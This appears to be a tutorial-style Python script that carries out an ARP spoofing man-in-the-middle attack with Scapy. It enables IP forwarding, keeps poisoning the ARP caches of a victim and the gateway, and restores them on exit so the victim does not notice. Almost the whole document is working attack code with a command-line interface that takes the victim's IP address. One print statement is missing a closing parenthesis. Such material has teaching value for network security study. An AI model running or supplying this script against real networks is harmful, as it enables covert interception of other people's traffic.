'''
it is a method of gaining a man-in-the-middle situation.

Although this will work perfectly on Unix-based and Windows
machines, you have to install pywin32
if you’re on Windows:
$ pip install pywin32
'''

from scapy . all import Ether, ARP, srp , send
import argparse
import time
import os

'''
Enabling IP Forwarding
For Unix-like users, you need to change the value of the /proc/sys/net/ipv4/ip_forward file from 0 to 1, indicating that
it’s enabled, which requires root access.
The below function does that:
'''

def _enable_linux_iproute ():
    """Enables IP route (IP Forwarding) in linux-based distro"""
    file_path = "/proc/sys/net/ipv4/ip_forward"

    with open ( file_path ) as f :
        if f . read () == 1 :
            # already enabled
            return
    with open ( file_path , "w" ) as f :
        print(1, file=f)

'''
For Windows users, I have prepared services.py in the project
directory under the arp-spoof folder, which will help us interact
with Windows services easily. The below function imports that file and start the RemoteAccess service:
'''

def _enable_windows_iproute ():
    """Enables IP route (IP Forwarding) in Windows"""
    from services import WService

    # enable Remote Access service
    service = WService ( "RemoteAccess" , verbose = True )
    service.start()

'''
Now let’s make a function that enables IP forwarding on all platforms:
'''

def enable_ip_route ( verbose = True ):
    """Enables IP forwarding"""
    if verbose :
        print("[!] Enabling IP Routing...")

    _enable_windows_iproute() if "nt" in os . name else _enable_linux_iproute ()
    if verbose :
        print("[!] IP Routing enabled.")

'''
Implementing the ARP Spoofing Attack
Now let’s get into the fun stuff. First, we need a utility function that allows us to get the MAC address of any machine in the network:
'''

def get_mac ( ip ):
    """Returns MAC address of any device connected to the network If ip is down, returns None instead"""
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout = 3 , verbose = 0 )

    if ans :
        return ans[0][1].src

'''
We’re using Scapy’s srp() function to send requests as packets and keep listening for responses; in this case, we’re sending
ARP requests and listening for any ARP replies.
Since we’re setting the pdst attribute to the target IP, we should get an ARP response from that IP containing the MAC address in the response packet.
Next, we’re going to create a function that does the core of our work; given a target IP address and a host IP address, it
changes the ARP cache of the target IP address, saying that we have the host’s IP address:
'''

def spoof ( target_ip , host_ip , verbose = True ):
    """Spoofs 'target_ip' saying that we are 'host_ip'. it is accomplished by changing the ARP cache of the target (poisoning)"""
    # get the mac address of the target
    target_mac = get_mac(target_ip)

    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc = host_ip , op = 'is-at' )

    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)

    if verbose :
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is -at {}" . format ( target_ip , host_ip , self_mac )

'''
The above code gets the MAC address of the target using the
get_mac()
function we just created, crafts the malicious ARP
reply, and then sends it.
Once we want to stop the attack, we need to re-assign the real
addresses to the target device (as well as the gateway), if we
don't do that, the victim will lose internet connection, and it will
be evident that something happened, we don't want to do that,
so we will send seven legitimate ARP reply packets (a common practice) sequentially:
'''

def restore ( target_ip , host_ip , verbose = True ):
    """Restores the normal process of a regular network. This is done by sending the original informations (real IP and MAC of 'host_ip' ) to 'target_ip'"""
    # get the real MAC address of target
    target_mac = get_mac(target_ip)

    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)

    # crafting the restoring packet
    arp_response = ARP( pdst = target_ip , hwdst = target_mac , psrc = host_ip , hwsrc = host_mac , op = "is-at" )

    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose :
        print("[+] Sent to {} : {} is -at {}" . format ( target_ip , host_ip , host_mac ))

'''
This was similar to the spoof() function; the only difference is that it sends a few legitimate packets. In other words, it is sending accurate information.
Now we are going to need to write the main code, which is spoofing both; the target and host (gateway) simultaneously and infinitely until CTRL+C is pressed so that we will restore the original addresses:
'''

def arpspoof ( target , host , verbose = True ):
    """Performs an ARP spoof attack"""
    # enable IP forwarding
    enable_ip_route()
    try:
        while True:
            # telling the 'target' that we are the 'host'
            spoof(target, host, verbose)

            # telling the 'host' that we are the 'target'
            spoof(host, target, verbose)

            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait..." )

        # restoring the network
        restore(target, host)
        restore(host, target)

if __name__ == "__main__":
    parser = argparse . ArgumentParser ( description = "ARP spoof script" )
    parser.add_argument("target", help="Victim IP Address to ARP poison" )
    parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)" )
    parser.add_argument("-v", "--verbose", action="store_true" , help = "verbosity, default is True (simple message each second)" )

    args = parser . parse_args ()
    target, host, verbose = args.target, args.host, args.verbose

    # start the attack
    arpspoof(target, host, verbose)

'''
In my setup, I want to spoof a target address 192.168.1.100 . 
The gateway device that has the IP (router) IP address is 192.168.1.1 . Therefore, here’s my command:
$ python arp_spoof.py 192.168.1.100 192.168.1.1 --verbose
'''